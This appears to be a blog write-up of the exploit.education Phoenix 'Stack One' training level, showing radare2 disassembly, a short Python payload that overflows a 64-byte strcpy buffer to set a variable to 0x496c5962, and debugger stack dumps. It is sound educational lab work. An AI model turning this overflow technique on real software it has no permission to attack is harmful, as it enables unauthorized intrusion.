---
layout: post
title:  "Phoenix Stack One"
categories: exploit-education phoenix x86
---

Stack One is very much like the first level with a few minor exceptions, which will be introduced shortly.

The use of `rabin2` is essential to understand a little bit about the binary.

{% highlight shell %}
$ rabin2 -I /opt/phoenix/i486/stack-one
arch     x86
baddr    0x8048000
binsz    3651
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (GNU) 7.3.0
crypto   false
endian   little
havecode true
intrp    /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    no
rpath    /opt/phoenix/i486-linux-musl/lib
sanitiz  false
static   false
stripped false
subsys   linux
va       true
{% endhighlight %}

So as to avoid repetition, the information about the binary is almost identical to that of the previous level. To sum up, this is a 32-bit Linux ELF with no protection against stack-based buffer overflows, among others.

Time to disassemble the binary with `radare2`.

{% highlight shell %}
$ r2 /opt/phoenix/i486/stack-one
{% endhighlight %}

{% highlight nasm %}
[0x08048380]> aas
Cannot analyze at 0x080485f0
[0x08048380]> afl
0x080482fc    1 17           sym._init
0x080484d0    7 277  -> 112  sym.frame_dummy
0x080485b0    5 49           sym.__do_global_ctors_aux
0x080485e1    1 12           sym._fini
0x08048450    8 113  -> 111  sym.__do_global_dtors_aux
0x08048114   47 524  -> 625  sym..interp
0x08048380    1 62           entry0
0x08048370    1 6            sym.imp.__libc_start_main
0x080486f8    1 14           loc.__GNU_EH_FRAME_HDR
0x08048714    3 34           sym..eh_frame
0x08048750    1 44           obj.__EH_FRAME_BEGIN
0x080483c0    4 49   -> 40   sym.deregister_tm_clones
0x08048515    6 145          main
0x08048340    1 6            sym.imp.puts
0x08048350    1 6            sym.imp.errx
0x08048320    1 6            sym.imp.strcpy
0x08048330    1 6            sym.imp.printf
0x08048360    1 6            sym.imp.exit
[0x08048380]> s main
[0x08048515]> pdf
/ (fcn) main 145
|   int main (int argc, char **argv, char **envp);
|           ; var int32_t var_4ch @ ebp-0x4c
|           ; var int32_t var_ch @ ebp-0xc
|           ; arg int32_t arg_4h @ esp+0x4
|           ; DATA XREF from entry0 @ 0x80483b4
|           0x08048515      8d4c2404       lea ecx, [arg_4h]
|           0x08048519      83e4f0         and esp, 0xfffffff0
|           0x0804851c      ff71fc         push dword [ecx - 4]
|           0x0804851f      55             push ebp
|           0x08048520      89e5           mov ebp, esp
|           0x08048522      53             push ebx
|           0x08048523      51             push ecx
|           0x08048524      83ec50         sub esp, 0x50
|           0x08048527      89cb           mov ebx, ecx
|           0x08048529      83ec0c         sub esp, 0xc
|           0x0804852c      68f0850408     push str.Welcome_to_phoenix_stack_one__brought_to_you_by_https:__exploit.education ; sym..rodata
|                                                                      ; 0x80485f0 ; "Welcome to phoenix/stack-one, brought to you by https://exploit.education"
|           0x08048531      e80afeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x08048536      83c410         add esp, 0x10
|           0x08048539      833b01         cmp dword [ebx], 1
|       ,=< 0x0804853c      7f0f           jg 0x804854d
|       |   0x0804853e      83ec08         sub esp, 8
|       |   0x08048541      683c860408     push str.specify_an_argument__to_be_copied_into_the__buffer ; 0x804863c ; "specify an argument, to be copied into the \"buffer\""
|       |   0x08048546      6a01           push 1                      ; 1
|       |   0x08048548      e803feffff     call sym.imp.errx           ; void errx(int eval)
|       `-> 0x0804854d      c745f4000000.  mov dword [var_ch], 0
|           0x08048554      8b4304         mov eax, dword [ebx + 4]
|           0x08048557      83c004         add eax, 4
|           0x0804855a      8b00           mov eax, dword [eax]
|           0x0804855c      83ec08         sub esp, 8
|           0x0804855f      50             push eax
|           0x08048560      8d45b4         lea eax, [var_4ch]
|           0x08048563      50             push eax
|           0x08048564      e8b7fdffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
|           0x08048569      83c410         add esp, 0x10
|           0x0804856c      8b45f4         mov eax, dword [var_ch]
|           0x0804856f      3d62596c49     cmp eax, 0x496c5962
|       ,=< 0x08048574      7512           jne 0x8048588
|       |   0x08048576      83ec0c         sub esp, 0xc
|       |   0x08048579      6870860408     push str.Well_done__you_have_successfully_set_changeme_to_the_correct_value ; 0x8048670 ; "Well done, you have successfully set changeme to the correct value"
|       |   0x0804857e      e8bdfdffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048583      83c410         add esp, 0x10
|      ,==< 0x08048586      eb14           jmp 0x804859c
|      |`-> 0x08048588      8b45f4         mov eax, dword [var_ch]
|      |    0x0804858b      83ec08         sub esp, 8
|      |    0x0804858e      50             push eax
|      |    0x0804858f      68b4860408     push str.Getting_closer__changeme_is_currently_0x_08x__we_want_0x496c5962 ; 0x80486b4 ; "Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n"
|      |    0x08048594      e897fdffff     call sym.imp.printf         ; int printf(const char *format)
|      |    0x08048599      83c410         add esp, 0x10
|      |    ; CODE XREF from main @ 0x8048586
|      `--> 0x0804859c      83ec0c         sub esp, 0xc
|           0x0804859f      6a00           push 0
\           0x080485a1      e8bafdffff     call sym.imp.exit           ; void exit(int status)
{% endhighlight %}

Below is the output of `agf`, which outputs the basic blocks function graph.

{% highlight nasm %}
[0x08048515]> agf
[0x08048515]>  # int main (int argc, char **argv, char **envp);
                   .---------------------------------------------------------------------------------------.
                   |  0x8048515                                                                            |
                   | (fcn) main 145                                                                        |
                   |   int main (int argc, char **argv, char **envp);                                      |
                   | ; var int32_t var_4ch @ ebp-0x4c                                                      |
                   | ; var int32_t var_ch @ ebp-0xc                                                        |
                   | ; arg int32_t arg_4h @ esp+0x4                                                        |
                   | ; DATA XREF from entry0 @ 0x80483b4                                                   |
                   | lea ecx, [arg_4h]                                                                     |
                   | and esp, 0xfffffff0                                                                   |
                   | push dword [ecx - 4]                                                                  |
                   | push ebp                                                                              |
                   | mov ebp, esp                                                                          |
                   | push ebx                                                                              |
                   | push ecx                                                                              |
                   | sub esp, 0x50                                                                         |
                   | mov ebx, ecx                                                                          |
                   | sub esp, 0xc                                                                          |
                   | ; sym..rodata                                                                         |
                   | ; 0x80485f0                                                                           |
                   | ; "Welcome to phoenix/stack-one, brought to you by https://exploit.education"         |
                   | push str.Welcome_to_phoenix_stack_one__brought_to_you_by_https:__exploit.education    |
                   | ; int puts(const char *s)                                                             |
                   | call sym.imp.puts;[oa]                                                                |
                   | add esp, 0x10                                                                         |
                   | cmp dword [ebx], 1                                                                    |
                   | jg 0x804854d                                                                          |
                   `---------------------------------------------------------------------------------------'
                           f t
                           | |
                           | '--------------------------------------------.
    .----------------------'                                              |
    |                                                                     |
.----------------------------------------------------------------.    .---------------------------------------------.
|  0x804853e                                                     |    |  0x804854d                                  |
| sub esp, 8                                                     |    | mov dword [var_ch], 0                       |
| ; 0x804863c                                                    |    | mov eax, dword [ebx + 4]                    |
| ; "specify an argument, to be copied into the \"buffer\""      |    | add eax, 4                                  |
| push str.specify_an_argument__to_be_copied_into_the__buffer    |    | mov eax, dword [eax]                        |
| ; 1                                                            |    | sub esp, 8                                  |
| push 1                                                         |    | push eax                                    |
| ; void errx(int eval)                                          |    | lea eax, [var_4ch]                          |
| call sym.imp.errx;[ob]                                         |    | push eax                                    |
`----------------------------------------------------------------'    | ; char *strcpy(char *dest, const char *src) |
                                                                      | call sym.imp.strcpy;[oc]                    |
                                                                      | add esp, 0x10                               |
                                                                      | mov eax, dword [var_ch]                     |
                                                                      | cmp eax, 0x496c5962                         |
                                                                      | jne 0x8048588                               |
                                                                      `---------------------------------------------'
                                                                              f t
                                                                              | |
                                                                              | '-------------------.
              .---------------------------------------------------------------'                     |
              |                                                                                     |
          .--------------------------------------------------------------------------------.    .------------------------------------------------------------------------------.
          |  0x8048576                                                                     |    |  0x8048588                                                                   |
          | sub esp, 0xc                                                                   |    | mov eax, dword [var_ch]                                                      |
          | ; 0x8048670                                                                    |    | sub esp, 8                                                                   |
          | ; "Well done, you have successfully set changeme to the correct value"         |    | push eax                                                                     |
          | push str.Well_done__you_have_successfully_set_changeme_to_the_correct_value    |    | ; 0x80486b4                                                                  |
          | ; int puts(const char *s)                                                      |    | ; "Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n"       |
          | call sym.imp.puts;[oa]                                                         |    | push str.Getting_closer__changeme_is_currently_0x_08x__we_want_0x496c5962    |
          | add esp, 0x10                                                                  |    | ; int printf(const char *format)                                             |
          | jmp 0x804859c                                                                  |    | call sym.imp.printf;[od]                                                     |
          `--------------------------------------------------------------------------------'    | add esp, 0x10                                                                |
              v                                                                                 `------------------------------------------------------------------------------'
              |                                                                                     v
              |                                                                                     |
              '------------------------------------------------------------------.                  |
                                                                                 | .----------------'
                                                                                 | |
                                                                           .-----------------------------------.
                                                                           |  0x804859c                        |
                                                                           | ; CODE XREF from main @ 0x8048586 |
                                                                           | sub esp, 0xc                      |
                                                                           | push 0                            |
                                                                           | ; void exit(int status)           |
                                                                           | call sym.imp.exit;[oe]            |
                                                                           `-----------------------------------'
{% endhighlight %}

Unlike the previous level, the input is not read from STDIN, but, rather, is passed as an argument to the binary. Also, the `gets` call is replaced by `strcpy`, which also allows stack-based buffer overflows considering that it does not restrict the size of bytes to be copied.

The buffer's size is still 64 bytes and we need to overflow the stack so that the value of the local variable `var_ch` is overwritten with `0x496c5962`.

Here follows a `python3` script to create the exploit:

{% highlight python %}
#!/usr/bin/env python3
print("X"*64+"\x62\x59\x6c\x49")
{% endhighlight %}

{% highlight shell %}
$ ./myScript.py > pattern
{% endhighlight %}

Now, the binary can be debugged as follows:

{% highlight shell %}
$ r2 -d /opt/phoenix/i486/stack-one `cat pattern`
{% endhighlight %}

In order to verify the stack contents before and after the `strcpy` call, a breakpoint is needed at the address of that call.

{% highlight nasm %}
[0xf7f20d4b]> aas
Cannot analyze at 0x080485f0
[0xf7f20d4b]> db 0x08048564
[0xf7f20d4b]> dc
Welcome to phoenix/stack-one, brought to you by https://exploit.education
hit breakpoint at: 8048564
{% endhighlight %}

The value of `var_ch` before the call is:

{% highlight nasm %}
[0xf7eed929]> px/xw 0xffa8aeb8-0xc
0xffa8aeac  0x00000000                                   ....
{% endhighlight %}

The stack before the call:

{% highlight nasm %}
[0x08048564]> dr
eax = 0xffa8ae6c
ebx = 0xffa8aed0
ecx = 0xffa8ada0
edx = 0x00000000
esi = 0xffa8af44
edi = 0x00000002
esp = 0xffa8ae50
ebp = 0xffa8aeb8
eip = 0x08048564
eflags = 0x00000292
oeax = 0xffffffff
[0x08048564]> px/24xw 0xffa8ae50
0xffa8ae50  0xffa8ae6c 0xffa8c5cb 0x0000007d 0x00000010  l.......}.......
0xffa8ae60  0x080482fc 0x080485e1 0x00000000 0x0000005c  ............\...
0xffa8ae70  0x00000000 0x00000000 0x00000000 0x00000000  ................
0xffa8ae80  0x00000011 0xf7f5819c 0x00000000 0x080482cc  ................
0xffa8ae90  0x00000000 0x00000000 0x00000000 0x00000000  ................
0xffa8aea0  0x00000000 0x00000000 0x00000000 0x00000000  ................
{% endhighlight %}

and after the call:

{% highlight nasm %}
[0x08048564]> dso
hit breakpoint at: 8048569
[0x08048564]> px/24xw 0xffa8ae50
0xffa8ae50  0xffa8ae6c 0xffa8c5cb 0x0000007d 0x00000010  l.......}.......
0xffa8ae60  0x080482fc 0x080485e1 0x00000000 0x58585858  ............XXXX
0xffa8ae70  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xffa8ae80  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xffa8ae90  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xffa8aea0  0x58585858 0x58585858 0x58585858 0x496c5962  XXXXXXXXXXXXbYlI
{% endhighlight %}

Note that the value of the local variable `var_ch` has been overwritten, as is shown below:

{% highlight nasm %}
[0x08048564]> px/xw 0xffa8aeb8-0xc
0xffa8aeac  0x496c5962                                   bYlI
{% endhighlight %}

Continuing with the execution:

{% highlight plaintext %}
[0x08048564]> dc
Well done, you have successfully set changeme to the correct value
{% endhighlight %}

## Conclusion
This level has many similarities with the first level, but with one noteable difference. That is, the objective was not to simply overwrite the value of a local variable, but to overflow the stack such that the variable contains a specific value.